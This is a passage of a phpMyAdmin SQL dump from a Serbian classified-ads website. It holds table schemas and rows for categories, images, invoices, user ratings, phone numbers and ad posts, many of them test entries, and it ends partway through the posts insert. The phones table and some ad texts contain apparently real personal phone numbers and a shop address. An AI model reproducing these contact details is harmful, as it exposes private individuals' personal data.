-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Jul 24, 2023 at 07:30 PM
-- Server version: 10.5.20-MariaDB
-- PHP Version: 7.3.33

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `id18101305_classimax`
--

-- --------------------------------------------------------

--
-- Table structure for table `categories`
--

CREATE TABLE `categories` (
  `id` int(11) NOT NULL,
  `category` varchar(255) NOT NULL,
  `id_parrent` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `categories`
--

INSERT INTO `categories` (`id`, `category`, `id_parrent`) VALUES
(1, 'Cars', NULL),
(2, 'Games', NULL),
(3, 'Bike', NULL),
(4, 'Motorcycle', NULL),
(5, 'Hygiene', NULL),
(6, 'Pets', NULL),
(8, 'Services', NULL),
(10, 'Eletronics', NULL),
(11, 'Phones', NULL),
(12, 'TV', NULL),
(13, 'Weapons', NULL),
(14, 'Manual', 1),
(15, 'Automatic', 1),
(16, 'Cabriolet', 1),
(17, 'Limousine', 1),
(18, 'Caravan', 1),
(19, 'Xbox games', 2),
(20, 'Sony playstation games', 2),
(21, 'Computer games', 2),
(22, 'MTB', 3),
(23, 'Roadster', 3),
(24, 'Eletrics', 3),
(25, 'BMX', 3),
(26, 'Scooter', 4),
(27, 'Sport', 4),
(28, 'Quad', 4),
(29, 'Vacuum cleaner', 5),
(30, 'Cleaners', 5),
(31, 'Air freshener', 5),
(32, 'Against insects', 5),
(33, 'Dogs', 6),
(34, 'Cats', 6),
(35, 'Fish and aquariums', 6),
(36, 'Equipment for pets', 6),
(37, 'Home furniture', NULL),
(38, 'Pc computers', 10),
(39, 'PS console', 10),
(40, 'Xbox console', 10),
(41, 'Gaming equipment', 10),
(42, 'Laptops', 10),
(43, 'Ps games', 2),
(44, 'Nitendo games', 2),
(45, 'VR games', 2),
(47, 'Racer', 3),
(48, 'Iphone', 11),
(49, 'Samsung', 11),
(50, 'Huawei', 11),
(51, 'Xaomi', 11),
(52, 'Honor', 11),
(53, 'Smart', 12),
(54, 'Plasma', 12),
(55, 'Oled', 12),
(56, 'Guns', 13),
(57, 'Knives', 13),
(59, 'Shield', 13),
(60, 'Armor', 13),
(61, 'Bed-sitter', 37),
(62, 'Garden set', 37),
(63, 'Cabinet', 37),
(64, 'Chest of drawers', 37),
(66, 'Massage', 8),
(67, 'Personal coach', 8),
(68, 'Cleaning lady', 8),
(69, 'Creation of web sites', 8),
(70, 'Creating applications', 8);

-- --------------------------------------------------------

--
-- Table structure for table `category_icons`
--

CREATE TABLE `category_icons` (
  `id` int(11) NOT NULL,
  `id_category` int(11) NOT NULL,
  `icon` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `category_icons`
--

INSERT INTO `category_icons` (`id`, `id_category`, `icon`) VALUES
(1, 2, 'fas fa-dice'),
(2, 1, 'fas fa-car'),
(3, 3, 'fas fa-bicycle'),
(4, 4, 'fas fa-motorcycle'),
(5, 5, 'fas fa-hands-wash'),
(6, 6, 'fas fa-paw'),
(7, 8, 'fas fa-concierge-bell'),
(8, 10, 'fas fa-atom'),
(9, 11, 'fas fa-mobile-alt'),
(10, 12, 'fas fa-tv'),
(11, 13, 'fas fa-bullseye'),
(12, 37, 'fas fa-couch');

-- --------------------------------------------------------

--
-- Table structure for table `cities`
--

CREATE TABLE `cities` (
  `id` int(11) NOT NULL,
  `city` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `cities`
--

INSERT INTO `cities` (`id`, `city`) VALUES
(1, 'Belgrade'),
(2, 'Novi Sad'),
(3, 'Kragujevac'),
(4, 'Nis');

-- --------------------------------------------------------

--
-- Table structure for table `currencies`
--

CREATE TABLE `currencies` (
  `id` int(11) NOT NULL,
  `currency` char(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `currencies`
--

INSERT INTO `currencies` (`id`, `currency`) VALUES
(1, 'RSD'),
(2, 'EUR'),
(3, 'USD');

-- --------------------------------------------------------

--
-- Table structure for table `deliveries`
--

CREATE TABLE `deliveries` (
  `id` int(11) NOT NULL,
  `delivery` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `deliveries`
--

INSERT INTO `deliveries` (`id`, `delivery`) VALUES
(1, 'Express post'),
(2, 'Personal pickup'),
(3, 'Seller\'s delivery'),
(4, 'All');

-- --------------------------------------------------------

--
-- Table structure for table `favorites`
--

CREATE TABLE `favorites` (
  `id` int(11) NOT NULL,
  `id_user` int(11) NOT NULL,
  `id_post` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `favorites`
--

INSERT INTO `favorites` (`id`, `id_user`, `id_post`) VALUES
(7, 23, 25),
(10, 14, 69),
(11, 14, 25),
(12, 14, 71),
(13, 14, 73),
(14, 14, 68),
(15, 14, 67),
(16, 14, 57),
(17, 14, 31),
(18, 14, 70),
(19, 14, 59),
(20, 14, 74),
(21, 14, 58),
(22, 14, 76),
(26, 14, 75),
(27, 14, 86);

-- --------------------------------------------------------

--
-- Table structure for table `images`
--

CREATE TABLE `images` (
  `id` int(11) NOT NULL,
  `id_post` int(11) NOT NULL,
  `src` varchar(255) NOT NULL,
  `alt` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `images`
--

INSERT INTO `images` (`id`, `id_post`, `src`, `alt`) VALUES
(13, 19, 'user-image/1660685292.png', 'business_4.png'),
(14, 20, 'user-image/1660753455.png', 'business_10.png'),
(15, 20, 'user-image/1660753455.png', 'business_11.png'),
(16, 20, 'user-image/1660753456.png', 'business_12.png'),
(17, 21, 'user-image/1660753542.png', 'business_1.png'),
(18, 21, 'user-image/1660753543.png', 'business_2.png'),
(19, 23, 'user-image/empty.png', 'empty photo products'),
(20, 24, 'user-image/empty.png', 'empty photo products'),
(24, 26, 'user-image/1660854692.jpeg', 'products-1.jpg'),
(25, 26, 'user-image/1660854693.jpeg', 'products-2.jpg'),
(26, 26, 'user-image/1660854693.jpeg', 'products-3.jpg'),
(27, 26, 'user-image/1660854693.jpeg', 'products-4.jpg'),
(28, 27, 'user-image/1660856011.jpeg', 'products-1.jpg'),
(29, 27, 'user-image/1660856011.jpeg', 'products-2.jpg'),
(30, 27, 'user-image/1660856011.jpeg', 'products-3.jpg'),
(31, 27, 'user-image/1660856011.jpeg', 'products-4.jpg'),
(32, 29, 'user-image/1660858656.jpeg', 'products-2.jpg'),
(33, 29, 'user-image/1660858656.jpeg', 'products-3.jpg'),
(34, 29, 'user-image/1660858657.jpeg', 'products-4.jpg'),
(35, 30, 'user-image/1660858814.jpeg', 'products-3.jpg'),
(36, 30, 'user-image/1660858815.jpeg', 'products-4.jpg'),
(38, 32, 'user-image/empty.png', 'empty photo products'),
(39, 33, 'user-image/empty.png', 'empty photo products'),
(40, 34, 'user-image/empty.png', 'empty photo products'),
(41, 35, 'user-image/empty.png', 'empty photo products'),
(42, 36, 'user-image/empty.png', 'empty photo products'),
(43, 37, 'user-image/empty.png', 'empty photo products'),
(44, 38, 'user-image/empty.png', 'empty photo products'),
(45, 39, 'user-image/empty.png', 'empty photo products'),
(46, 40, 'user-image/empty.png', 'empty photo products'),
(47, 41, 'user-image/empty.png', 'empty photo products'),
(48, 42, 'user-image/empty.png', 'empty photo products'),
(49, 43, 'user-image/empty.png', 'empty photo products'),
(50, 44, 'user-image/empty.png', 'empty photo products'),
(51, 45, 'user-image/empty.png', 'empty photo products'),
(52, 46, 'user-image/empty.png', 'empty photo products'),
(53, 47, 'user-image/empty.png', 'empty photo products'),
(54, 48, 'user-image/empty.png', 'empty photo products'),
(55, 49, 'user-image/empty.png', 'empty photo products'),
(56, 50, 'user-image/empty.png', 'empty photo products'),
(57, 51, 'user-image/empty.png', 'empty photo products'),
(58, 52, 'user-image/empty.png', 'empty photo products'),
(59, 53, 'user-image/empty.png', 'empty photo products'),
(60, 54, 'user-image/empty.png', 'empty photo products'),
(61, 55, 'user-image/empty.png', 'empty photo products'),
(62, 56, 'user-image/empty.png', 'empty photo products'),
(66, 59, 'user-image/empty.png', 'empty photo products'),
(94, 60, 'user-image/1661000128896568935.jpeg', 'products-1.jpg'),
(95, 60, 'user-image/16610001291701344435.jpeg', 'products-2.jpg'),
(96, 60, 'user-image/1661000129920183298.jpeg', 'products-3.jpg'),
(97, 60, 'user-image/16610001291905500109.jpeg', 'products-4.jpg'),
(98, 61, 'user-image/empty.png', 'empty photo products'),
(99, 62, 'user-image/empty.png', 'empty photo products'),
(100, 63, 'user-image/empty.png', 'empty photo products'),
(101, 64, 'user-image/166108422897426089.png', '1660685292.png'),
(102, 65, 'user-image/1661084316768066526.png', '1660685292.png'),
(103, 65, 'user-image/16610843161965744465.jpeg', '1660856011.jpeg'),
(105, 68, 'user-image/166116515788098377.jpeg', 'products-1.jpg'),
(106, 68, 'user-image/16611651582017769548.jpeg', 'products-2.jpg'),
(107, 68, 'user-image/16611651581455484090.jpeg', 'products-3.jpg'),
(108, 69, 'user-image/1661166027763928630.jpeg', 'post-1.jpg'),
(110, 71, 'user-image/16613655171552505387.jpeg', 'signin-image.jpg'),
(111, 71, 'user-image/16613655171592852801.jpeg', 'signup-image.jpg'),
(112, 72, 'user-image/166136610964002927.jpeg', 'men-01.jpg'),
(113, 72, 'user-image/16613661101235790472.jpeg', 'men-02.jpg'),
(114, 72, 'user-image/1661366110530591577.jpeg', 'men-03.jpg'),
(115, 72, 'user-image/16613661101180107407.jpeg', 'men-10.jpg'),
(116, 73, 'user-image/1661366336775289111.jpeg', 'laptop.jpg'),
(117, 74, 'user-image/16613665451548410029.jpeg', 'maca2.jpg'),
(118, 74, 'user-image/166136654661580552.jpeg', 'maca.jpg'),
(119, 75, 'user-image/1661425224228439273.jpeg', 'gerber33.jpeg'),
(120, 75, 'user-image/1661425226947313563.jpeg', 'gerber22.jpeg'),
(121, 75, 'user-image/1661425226532550587.jpeg', 'gereber1.jpg'),
(122, 25, 'user-image/16615125231874119124.jpeg', 'golf3.jfif'),
(123, 25, 'user-image/166151252338338084.jpeg', 'golf2.jpg'),
(124, 25, 'user-image/16615125231162932321.jpeg', 'golf.jpg'),
(125, 76, 'user-image/16615293451244444278.jpeg', 'xboxpass3.jpg'),
(126, 76, 'user-image/16615293451012574766.jpeg', 'xboxpass2.jpg'),
(127, 76, 'user-image/1661529345591990243.jpeg', 'xboxpass.jpg'),
(128, 77, 'user-image/1661530517314511418.jpeg', 'vazduha5.jfif'),
(129, 77, 'user-image/1661530517748572664.jpeg', 'vazduha4.jpg'),
(130, 77, 'user-image/16615305181236391642.jpeg', 'vazduha3.jpg'),
(131, 77, 'user-image/16615305181702866221.jpeg', 'vazduha2.jpg'),
(132, 78, 'user-image/1661703324818622293.jpeg', 'iphone5.jpeg'),
(133, 78, 'user-image/16617033251601681708.jpeg', 'iphone4.jpg'),
(134, 78, 'user-image/1661703325560883520.png', 'iphone3.png'),
(135, 78, 'user-image/16617033261941591526.png', 'iphone2.png'),
(136, 78, 'user-image/16617033262043892496.jpeg', 'iphone1.jpg'),
(137, 79, 'user-image/1661703560329829673.jpeg', 'genesisbike2.jpg'),
(138, 79, 'user-image/16617035611154696269.jpeg', 'genesisbike1.jpeg'),
(139, 80, 'user-image/1661703994812070275.jpeg', 'tv4.jfif'),
(140, 80, 'user-image/1661703994646755539.jpeg', 'tv3.jpeg'),
(141, 80, 'user-image/16617039941404880964.jpeg', 'tv2.jfif'),
(142, 80, 'user-image/1661703995791994902.jpeg', 'tv1.jfif'),
(143, 81, 'user-image/16617050351468693438.jpeg', 'bmw5.jpg'),
(144, 81, 'user-image/16617050361950677757.jpeg', 'bmw4.jpg'),
(145, 81, 'user-image/1661705036778562551.jpeg', 'bmw3.jpg'),
(146, 81, 'user-image/1661705036653679666.jpeg', 'bmw2.jpg'),
(147, 81, 'user-image/16617050371524957825.jpeg', 'bmw1.jpg'),
(151, 82, 'user-image/1661705697224009304.jpeg', 'set4.jpg'),
(152, 82, 'user-image/1661705698774815224.jpeg', 'set3.jpg'),
(153, 83, 'user-image/1661706174771789786.jpeg', 'ghost2.jpg'),
(154, 83, 'user-image/16617061751495086106.jpeg', 'ghost.jpg'),
(157, 70, 'user-image/1662114841424747926.png', 'min-1661168174.png'),
(159, 67, 'user-image/16621165002007337383.jpeg', 'bagerNovi2.jpeg'),
(160, 67, 'user-image/16621165002120414065.jpeg', 'bagerNovi.jpeg'),
(161, 31, 'user-image/16621168121016205611.jpeg', 'p403.jpg'),
(162, 31, 'user-image/1662116812417818792.png', 'p402.png'),
(163, 31, 'user-image/1662116813899731065.jpeg', 'p40.jpg'),
(164, 57, 'user-image/16621169801909657942.jpeg', 'stenad3.jpg'),
(165, 57, 'user-image/16621169801494153141.jpeg', 'stenad2.jpg'),
(166, 57, 'user-image/16621169801600352174.jpeg', 'stenad.jpg'),
(167, 58, 'user-image/16621172421960513355.jpeg', 'bmx3.jpg'),
(168, 58, 'user-image/16621172421595260692.jpeg', 'bmx2.jpg'),
(169, 58, 'user-image/1662117242997745368.png', 'bmx.png'),
(170, 84, 'user-image/1662191340586476103.jpeg', 'monalisa-v.jpg'),
(171, 85, 'user-image/1668262869579439390.jpeg', 'Assassin’s Creed® IV Black Flag™2018-7-2-2-19-50.jpg'),
(172, 86, 'user-image/16682630202001275227.jpeg', '1589313176-GettyImages-1127637966.jpg'),
(173, 87, 'user-image/1668263159909151964.jpeg', '54f737502df8f8f7333ac3a073a392c3.jpg'),
(174, 88, 'user-image/1679435154829156438.jpeg', 'zvucnici1.jpg'),
(175, 88, 'user-image/1679435154460702147.jpeg', 'zvucnici2.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `invoices`
--

CREATE TABLE `invoices` (
  `id` int(11) NOT NULL,
  `id_user` int(11) NOT NULL,
  `id_promotion` int(11) NOT NULL,
  `date_start` datetime NOT NULL DEFAULT current_timestamp(),
  `date_end` datetime NOT NULL,
  `id_post` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `invoices`
--

INSERT INTO `invoices` (`id`, `id_user`, `id_promotion`, `date_start`, `date_end`, `id_post`) VALUES
(5, 14, 6, '2022-08-16 23:28:13', '2023-12-29 23:28:13', 72),
(6, 14, 3, '2022-08-17 18:24:15', '2023-12-29 18:24:15', 82),
(7, 14, 1, '2022-08-18 01:38:17', '2022-08-30 01:38:17', 24),
(8, 14, 6, '2022-12-14 01:40:43', '2023-12-23 01:40:43', 25),
(9, 23, 3, '2022-08-18 22:53:31', '0000-00-00 00:00:00', 27),
(10, 23, 1, '2022-08-18 23:40:15', '2022-08-25 23:40:15', 30),
(11, 23, 6, '2022-12-14 23:44:58', '2023-12-13 23:44:58', 31),
(12, 23, 4, '2022-08-19 00:15:34', '2022-08-26 00:15:34', 57),
(13, 24, 5, '2022-08-20 14:55:28', '2022-09-04 14:55:28', 60),
(14, 14, 5, '2022-08-22 11:45:50', '2022-09-06 11:45:50', 67),
(15, 14, 5, '2022-08-22 12:45:57', '2022-09-06 12:45:57', 68),
(16, 14, 2, '2022-08-22 13:00:28', '2022-09-06 13:00:28', 69),
(17, 14, 1, '2022-08-24 20:25:17', '2022-08-31 20:25:17', 71),
(18, 14, 1, '2022-08-24 20:38:56', '2022-09-29 20:38:56', 73),
(19, 14, 6, '2022-12-14 13:00:26', '2023-12-31 13:00:26', 75),
(20, 25, 6, '2022-12-14 18:15:25', '2023-12-08 18:15:25', 78),
(21, 25, 1, '2022-12-14 18:26:34', '2023-12-30 18:26:34', 80),
(22, 25, 5, '2022-08-28 18:43:56', '2022-09-12 18:43:56', 81),
(23, 14, 3, '2022-11-12 14:21:09', '2023-12-29 14:21:09', 85),
(24, 14, 3, '2022-11-12 14:23:40', '2023-12-21 14:23:40', 86),
(25, 14, 1, '2022-11-12 14:26:00', '2023-08-25 23:00:16', 87),
(26, 14, 6, '2023-03-21 21:45:54', '2023-04-20 21:45:54', 88);

-- --------------------------------------------------------

--
-- Table structure for table `likes`
--

CREATE TABLE `likes` (
  `id` int(255) NOT NULL,
  `id_who` int(11) NOT NULL,
  `id_whom` int(11) NOT NULL,
  `stars` int(11) NOT NULL,
  `message` varchar(5000) DEFAULT NULL,
  `date_created` date DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `likes`
--

INSERT INTO `likes` (`id`, `id_who`, `id_whom`, `stars`, `message`, `date_created`) VALUES
(1, 24, 14, 4, 'Sve ok', '2022-08-25'),
(3, 14, 24, 5, NULL, '2022-08-25'),
(4, 23, 24, 3, 'Nemam zamerki', '2022-08-25'),
(5, 24, 23, 5, 'Svaka preporuka za ovog biznismena', '2022-08-25'),
(29, 14, 25, 1, 'Nije ispostovao rok dostave.', '2022-08-29'),
(30, 26, 14, 5, 'Svaka pohvala, uvek sve po dogovoru i na vreme.', '2022-09-02');

-- --------------------------------------------------------

--
-- Table structure for table `phones`
--

CREATE TABLE `phones` (
  `id` int(11) NOT NULL,
  `phone` varchar(255) NOT NULL,
  `id_user` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `phones`
--

INSERT INTO `phones` (`id`, `phone`, `id_user`) VALUES
(52, '+381655869641', 23),
(53, '+381697264681', 23),
(54, '+38162859543', 23),
(56, '+381659685487', 25),
(57, '+381611358987', 25),
(58, '+381611352684', 26),
(60, '+38164545768', 28),
(61, '+381611357235', 14);

-- --------------------------------------------------------

--
-- Table structure for table `posts`
--

CREATE TABLE `posts` (
  `id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL,
  `description` varchar(5000) NOT NULL,
  `id_state` int(11) NOT NULL,
  `id_price_status` int(11) NOT NULL,
  `src` varchar(255) DEFAULT NULL,
  `id_user` int(11) NOT NULL,
  `date_created` datetime NOT NULL DEFAULT current_timestamp(),
  `date_updated` datetime DEFAULT NULL,
  `date_deleted` datetime DEFAULT NULL,
  `id_delivery` int(11) NOT NULL,
  `id_category` int(11) NOT NULL,
  `min_src` varchar(255) NOT NULL,
  `you_tube` varchar(5000) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `posts`
--

INSERT INTO `posts` (`id`, `title`, `description`, `id_state`, `id_price_status`, `src`, `id_user`, `date_created`, `date_updated`, `date_deleted`, `id_delivery`, `id_category`, `min_src`, `you_tube`) VALUES
(19, 'Novo', '0', 2, 4, 'user-image/1660685292.png', 14, '2022-08-16 23:28:13', '2022-08-28 00:00:00', '2022-08-18 14:11:43', 2, 14, 'user-image/min-1660685293.png', NULL),
(20, '0', '0', 2, 5, 'user-image/1660753455.png', 14, '2022-08-17 18:24:15', NULL, '2022-08-21 14:28:10', 2, 14, 'user-image/min-1660753455.png', NULL),
(21, '0', '0', 1, 4, 'user-image/1660753542.png', 14, '2022-08-17 18:25:43', NULL, '2022-08-21 14:28:08', 2, 26, 'user-image/min-1660753543.png', NULL),
(22, 'Naslov', '0', 1, 1, 'user-image/empty.png', 14, '2022-08-17 23:27:24', NULL, '2022-08-21 14:28:07', 1, 14, 'user-image/min-empty.png', NULL),
(23, 'title', 'Opis neki', 1, 1, 'user-image/empty.png', 14, '2022-08-17 23:27:42', NULL, '2022-08-21 14:28:04', 1, 14, 'user-image/min-empty.png', NULL),
(24, 'Najnoviji Oglas', 'Opiiis', 2, 1, 'user-image/empty.png', 14, '2022-08-18 01:38:17', NULL, '2022-08-21 14:28:02', 1, 14, 'user-image/min-empty.png', NULL),
(25, 'Golf 2 dobar', 'Godiste: 2002.\r\n\r\nKubikaza: 1600 cm3\r\n\r\nKilometraza: 380 000km\r\n\r\nNe registrovan.\r\nGolf je u voznom stanju i registrovan je, za vise info pozvati.', 2, 1, 'user-image/16615125231874119124.jpeg', 23, '2022-08-18 01:40:43', '2022-09-02 11:07:29', NULL, 2, 14, 'user-image/min-16615125231431252027.jpeg', NULL),
(26, 'Prodajem picu', 'Najbolja pica u gradu', 2, 1, 'user-image/1660854692.jpeg', 23, '2022-08-18 22:31:33', NULL, '2022-08-18 22:31:53', 2, 20, 'user-image/min-1660854693.jpeg', NULL),
(27, 'Prodajem Bubreg', 'Kao nov jako slabo koriscen u jako dobrom stanju amo ozbiljni kupci.', 2, 1, 'user-image/1660856011.jpeg', 23, '2022-08-18 22:53:31', NULL, '2022-08-18 23:34:53', 3, 23, 'user-image/min-1660856011.jpeg', NULL),
(28, 'Fiat 500 L', 'Odlican za duze putovanje', 2, 5, 'user-image/1660858546.jpeg', 23, '2022-08-18 23:35:47', NULL, '2022-08-18 23:38:22', 2, 14, 'user-image/min-1660858547.jpeg', NULL),
(29, 'Fiat 500 L', 'Odlican za duze putovanje', 2, 5, 'user-image/1660858656.jpeg', 23, '2022-08-18 23:37:36', NULL, '2022-08-18 23:37:48', 2, 14, 'user-image/min-1660858656.jpeg', NULL),
(30, 'Fiat', 'Na gascinu', 1, 1, 'user-image/1660858814.jpeg', 23, '2022-08-18 23:40:15', NULL, '2022-08-19 00:01:38', 1, 14, 'user-image/min-1660858815.jpeg', NULL),
(31, 'Huawei p40 PRO', 'Prodajem Huawei P40 pro\r\nROM 256 GB\r\nRAM 8GB\r\nBoja: Ice White\r\nModel: ELS-NX9\r\nDual SIM\r\nMoguce koriscenje u svim mrezama\r\nTelefon je koriscen, veoma ocuvan, bez ogrebotina. Na ekranu je zalepljeno fleksi staklo.\r\nUz telefon idu, slusalice ne koriscene, original brzi punjac i dve maske.\r\nTelefon ima svoju original kutiju.\r\nJos godinu dana garancije u Vip-u.\r\nZa sve dodatne informacibe pisite ili zovite.', 2, 5, 'user-image/16621168121016205611.jpeg', 23, '2022-08-18 23:44:58', '2022-09-02 11:06:52', NULL, 4, 50, 'user-image/min-16621168121953092943.jpeg', NULL),
(32, 's', 's', 1, 1, 'user-image/empty.png', 23, '2022-08-18 23:46:18', NULL, '2022-08-19 00:03:11', 1, 14, 'user-image/min-empty.png', NULL),
(33, 'd', 'r', 1, 1, 'user-image/empty.png', 23, '2022-08-18 23:46:28', NULL, '2022-08-19 00:14:05', 1, 14, 'user-image/min-empty.png', NULL),
(34, 'as', 'ds', 1, 1, 'user-image/empty.png', 23, '2022-08-18 23:46:34', NULL, '2022-08-19 00:14:03', 1, 14, 'user-image/min-empty.png', NULL),
(35, 'rs', 'rs', 1, 1, 'user-image/empty.png', 23, '2022-08-18 23:46:41', NULL, '2022-08-19 00:14:02', 1, 14, 'user-image/min-empty.png', NULL),
(36, 'sr', 'rs', 1, 1, 'user-image/empty.png', 23, '2022-08-18 23:46:51', NULL, '2022-08-19 00:14:01', 1, 14, 'user-image/min-empty.png', NULL),
(37, 'sr', 'rs', 1, 1, 'user-image/empty.png', 23, '2022-08-18 23:46:58', NULL, '2022-08-19 00:14:00', 1, 14, 'user-image/min-empty.png', NULL),
(38, 'gdgs', 'dgsgds', 1, 1, 'user-image/empty.png', 23, '2022-08-18 23:47:05', NULL, '2022-08-19 00:03:54', 1, 14, 'user-image/min-empty.png', NULL),
(39, 'fdhgfhfg', 'fghfghfg', 1, 1, 'user-image/empty.png', 23, '2022-08-18 23:47:12', NULL, '2022-08-19 00:03:53', 1, 14, 'user-image/min-empty.png', NULL),
(40, 'fgjfjyfht', 'jjyfhtfh', 1, 1, 'user-image/empty.png', 23, '2022-08-18 23:47:19', NULL, '2022-08-19 00:01:35', 1, 14, 'user-image/min-empty.png', NULL),
(41, 'sadaw', 'asdaw', 1, 1, 'user-image/empty.png', 23, '2022-08-18 23:47:45', NULL, '2022-08-19 00:01:34', 1, 14, 'user-image/min-empty.png', NULL),
(42, 'safasfasf', 'asfasfasf', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:04:03', NULL, '2022-08-19 00:13:59', 1, 14, 'user-image/min-empty.png', NULL),
(43, 'asgfsdfsfdf', 'essegsdfsd', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:04:14', NULL, '2022-08-19 00:13:58', 1, 14, 'user-image/min-empty.png', NULL),
(44, 'gdssdg', 'sdgsdg', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:04:25', NULL, '2022-08-19 00:13:48', 1, 14, 'user-image/min-empty.png', NULL),
(45, 'ssdjihk', 'hikhikhk', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:04:35', NULL, '2022-08-19 00:13:40', 1, 14, 'user-image/min-empty.png', NULL),
(46, 'lihlhihii', 'hilhilh', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:04:44', NULL, '2022-08-19 00:13:14', 1, 14, 'user-image/min-empty.png', NULL),
(47, 'hilhilhi', 'hihikhk', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:04:53', NULL, '2022-08-19 00:05:16', 1, 14, 'user-image/min-empty.png', NULL),
(48, 'dsfsfssdfse', 'd', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:05:08', NULL, '2022-08-19 00:05:14', 1, 14, 'user-image/min-empty.png', NULL),
(49, 'sads', 'asd', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:09:42', NULL, '2022-08-19 00:13:06', 1, 14, 'user-image/min-empty.png', NULL),
(50, 'asda', 'asda', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:09:49', NULL, '2022-08-19 00:13:05', 1, 14, 'user-image/min-empty.png', NULL),
(51, 'rsarasas', 's', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:09:58', NULL, '2022-08-19 00:13:04', 1, 14, 'user-image/min-empty.png', NULL),
(52, 'asdas', 'asasd', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:10:10', NULL, '2022-08-19 00:13:03', 1, 14, 'user-image/min-empty.png', NULL),
(53, 'sad', 'sd', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:10:17', NULL, '2022-08-19 00:13:02', 1, 14, 'user-image/min-empty.png', NULL),
(54, 'hygyg', 'gyyn', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:10:23', NULL, '2022-08-19 00:13:00', 1, 14, 'user-image/min-empty.png', NULL),
(55, 'sadawwd', 'adwdaw', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:13:24', NULL, '2022-08-19 00:13:39', 1, 14, 'user-image/min-empty.png', NULL),
(56, 'rrra', 'asdasd', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:13:34', NULL, '2022-08-19 00:13:47', 1, 14, 'user-image/min-empty.png', NULL),
(57, 'Francuski buldog plavi', 'Odgajivacnica francuskih buldoga Maksimus THE GREAT  prodaje francuske buldoge egzotičnih boja stari 9 nedelja vakcinisani spremni za prodaju otac lilac majka Plava roditelji su u vlasništu moguca dostava 3 ženke i jedan muzjak odličnog karaktera navikli na decu i druge pse razigrani i puni energije za vise info +381652729292 viber wacap ili redovan poziv moguca dostava u zemlji i inostranstvu', 1, 4, 'user-image/16621169801909657942.jpeg', 23, '2022-08-19 00:15:34', '2022-09-02 11:09:40', NULL, 2, 33, 'user-image/min-16621169801576534924.jpeg', NULL),
(58, 'BMX BMX Bicikl BMX Visitor 20\\\" novo (NOVO)', 'Ovde su u pitanju unikatni modeli ima ih samo 100 na svetu pa je samim tim i cena malao veca.\r\n\\\"FREESTYLE\\\" prodavnica i servis bicikala i sportske opreme \r\nZelena pijaca\r\nZmaj Jove Jovanovica 26-28\r\nLamela 2 Lokali 8 i 9 (stari red lokala)\r\n26000 Pancevo\r\n013/334-324', 1, 1, 'user-image/16621172421960513355.jpeg', 23, '2022-08-19 00:44:41', '2022-09-02 11:14:02', NULL, 3, 25, 'user-image/min-16621172422076439706.jpeg', NULL),
(59, 'fas', 'safasfdg', 1, 1, 'user-image/empty.png', 23, '2022-08-19 00:44:51', '2022-09-02 11:14:10', '2022-09-02 11:14:10', 1, 14, 'user-image/min-empty.png', NULL),
(60, 'Bulatov bureg pvovljno', 'Istrosen je dosta', 2, 1, 'user-image/1661000128896568935.jpeg', 24, '2022-08-20 14:55:28', NULL, '2022-08-20 15:02:38', 4, 20, 'user-image/min-1661000128.jpeg', NULL),
(61, 'asd', 'asd', 1, 4, 'user-image/empty.png', 24, '2022-08-20 15:03:16', NULL, '2022-08-20 15:03:19', 1, 14, 'user-image/min-empty.png', NULL),
(62, 'ss', 'ss', 1, 4, 'user-image/empty.png', 24, '2022-08-20 15:04:58', NULL, '2022-08-20 15:05:00', 1, 14, 'user-image/min-empty.png', NULL),
(63, 'sdadas', 'sdsad', 1, 4, 'user-image/empty.png', 24, '2022-08-20 15:05:57', NULL, '2022-08-20 15:06:00', 1, 14, 'user-image/min-empty.png', NULL),
